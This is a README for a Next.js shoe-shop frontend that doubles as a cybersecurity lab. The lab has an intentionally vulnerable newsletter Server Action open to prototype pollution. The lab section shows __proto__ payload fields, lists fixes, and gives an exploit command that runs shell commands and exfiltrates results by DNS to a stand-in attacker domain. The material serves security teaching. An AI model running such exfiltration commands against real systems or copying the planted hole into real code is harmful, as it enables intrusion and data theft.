# StepStyle Frontend - Next.js 15 Application

A modern React frontend for the StepStyle shoe e-commerce platform, built with **Next.js 15** using the **App Router** and **React Server Components**.

## Overview

Migrated from Vite to Next.js for better performance, built-in optimizations, and server-side capabilities. This frontend uses automatic file-based routing and middleware for authentication protection.

## Technology Stack

- **React**: 19.2.0
- **Next.js**: 15.5.16
- **Routing**: App Router with Route Groups
- **Authentication**: Custom context + middleware
- **Styling**: CSS with dark theme
- **Package Manager**: npm

## Project Structure

```
src/
├── app/
│   ├── (auth)/              # Public authentication routes
│   │   ├── login/page.jsx
│   │   └── register/page.jsx
│   ├── (protected)/         # Protected routes (require auth)
│   │   ├── page.jsx         # Home page
│   │   ├── products/
│   │   ├── about/
│   │   ├── blog/
│   │   ├── research/
│   │   ├── admin/reviews/
│   │   ├── product/[productId]/
│   │   └── portfolio/
│   └── layout.jsx           # Root layout
├── components/
│   ├── Header.jsx
│   ├── Footer.jsx
│   ├── Layout.jsx
│   └── ProtectedRoute.jsx
├── context/
│   └── AuthContext.jsx      # Auth provider
├── hooks/
│   └── useAuth.js           # Auth hook
├── app.css
└── index.css

middleware.js               # Route protection
next.config.js              # API configuration
jsconfig.json               # Path aliases
.env.local                  # Environment variables
```

## Installation

```bash
npm install
```

## Development

Start the development server:

```bash
npm run dev
```

Open [http://localhost:3000](http://localhost:3000) in your browser.

## Production

Build and run for production:

```bash
npm run build
npm start
```

## Linting

Run ESLint:

```bash
npm run lint
```

## Configuration

### Environment Variables

Create a `.env.local` file:

```env
NEXT_PUBLIC_API_URL=http://localhost:8000
API_URL=http://localhost:8000
```

### API Routes

All API calls are automatically proxied to the backend via `next.config.js`:
- `/login` → `http://localhost:8000/login`
- `/register` → `http://localhost:8000/register`
- `/products` → `http://localhost:8000/products`
- `/api/*` → `http://localhost:8000/api/*`

## Authentication

Authentication is handled through:

1. **AuthContext** (`src/context/AuthContext.jsx`) - Provides user state
2. **useAuth Hook** (`src/hooks/useAuth.js`) - Easy hook access
3. **Middleware** (`middleware.js`) - Route-level protection

```javascript
import { useAuth } from '@/hooks/useAuth';

function MyComponent() {
  const { user, role, login, logout, loading } = useAuth();
  // Your component logic
}
```

---

## ⚠️ CYBERSECURITY LAB: INTENTIONALLY VULNERABLE CODE

**THIS APPLICATION CONTAINS DELIBERATELY INTRODUCED VULNERABILITIES FOR EDUCATIONAL PURPOSES ONLY**

### Vulnerability: React Server Components / Server Actions - Prototype Pollution (CVE-2025-55182 Style)

**Affected Components:**
1. **`src/lib/actions.js`** - Vulnerable Server Action: `subscribeNewsletter()`
2. **`src/components/NewsletterForm.jsx`** - Client component that triggers the vulnerable Server Action

#### Vulnerability Details

The application is intentionally vulnerable to **prototype pollution attacks** via Server Actions that unsafely handle FormData:

**Insecure Practices:**
- ❌ No input validation or sanitization in Server Actions
- ❌ Direct use of `Object.assign()` to merge untrusted FormData into server objects
- ❌ Allows access to prototype chain via `__proto__` and `constructor.prototype` fields
- ❌ No whitelist of allowed fields
- ❌ Dynamic property assignment without restrictions

#### How the Attack Works

1. Attacker crafts a malicious POST request with `Next-Action` header pointing to the vulnerable `subscribeNewsletter` Server Action
2. Payload includes prototype pollution fields:
   ```json
   {
     "email": "attacker@example.com",
     "__proto__[isAdmin]": "true",
     "__proto__[permissions]": "admin"
   }
   ```
3. The Server Action receives the FormData and uses `Object.assign()` without validation
4. The `__proto__` fields pollute the Object prototype chain
5. All subsequent objects in the application inherit the polluted properties (e.g., `isAdmin: true`)
6. This can lead to privilege escalation, authentication bypass, or RCE depending on how the polluted properties are used

#### Example Exploit

Using the CVE-2025-55182 POC script:

```bash
python3 exploit.py -d attacker.com -l targets.txt -c "whoami"
```

The exploit sends a crafted RSC payload targeting the `/api/newsletter` or newsletter form endpoint.

#### Code Comments

All vulnerable code is marked with:
- 🔴 **INTENTIONALLY VULNERABLE** - Marks insecure implementation
- **HOW ATTACKERS EXPLOIT THIS** - Explains the attack vector
- **PROPER FIX** - Comments on what secure implementation would look like (NOT implemented)

#### How to Fix (NOT Implemented)

✅ Input validation using a schema library (Zod, Joi, Yup)  
✅ Whitelist only allowed field names  
✅ Reject any field containing `__proto__`, `constructor`, or `prototype`  
✅ Use `Object.create(null)` for safe objects  
✅ Never use `Object.assign()` with untrusted data  

#### Files to Review

- [src/lib/actions.js](src/lib/actions.js) - Vulnerable Server Action with detailed vulnerability comments
- [src/components/NewsletterForm.jsx](src/components/NewsletterForm.jsx) - Component that calls vulnerable action

**⚠️ DO NOT deploy this code to production or any publicly accessible environment.**

---

## Exploit Resources (Cybersecurity Lab)

The `payloads/` directory (located in the project root) contains the CVE-2025-55182 proof-of-concept exploit:

**Files:**
- `exploit.py` - Multi-threaded prototype pollution exploitation script
- `targets.txt` - List of vulnerable endpoints (newsletter form pages)

**Testing the Vulnerability:**

```bash
cd ../payloads
python3 exploit.py -d attacker.com -l targets.txt -c "whoami"
```

**Parameters:**
- `-d` DNS endpoint for command output exfiltration (e.g., attacker.com)
- `-l` Path to targets file containing vulnerable URLs
- `-c` Command to execute via prototype pollution (e.g., "whoami", "id", "cat /etc/passwd")

The exploit attempts to:
1. Send crafted RSC payloads to the vulnerable newsletter form
2. Inject `__proto__` fields to pollute the Object prototype
3. Trigger `child_process.execSync()` via property pollution
4. Exfiltrate command results via DNS queries to the attacker's domain

**⚠️ EDUCATIONAL PURPOSES ONLY** - For authorized testing only.
```

## Key Features

- ✅ **File-based Routing** - No router configuration needed
- ✅ **Route Groups** - Organize routes by feature
- ✅ **Middleware** - Automatic authentication checks
- ✅ **Server Components** - Optimize bundle size
- ✅ **API Rewrites** - Transparent backend proxying
- ✅ **Dark Theme** - Built-in yellow accent styling

## Migration Notes

This app was migrated from Vite to Next.js. Key changes:

- Removed `react-router-dom`, using Next.js built-in routing
- Changed `<Link to="">` to `<Link href="">`
- Changed `useNavigate()` to `useRouter()` from `next/navigation`
- Added middleware for route protection
- Reorganized pages into App Router structure

See [MIGRATION_COMPLETE.md](MIGRATION_COMPLETE.md) for detailed migration guide.

## Learn More

- [Next.js Documentation](https://nextjs.org/docs)
- [Next.js App Router Guide](https://nextjs.org/docs/app)
- [React Documentation](https://react.dev)
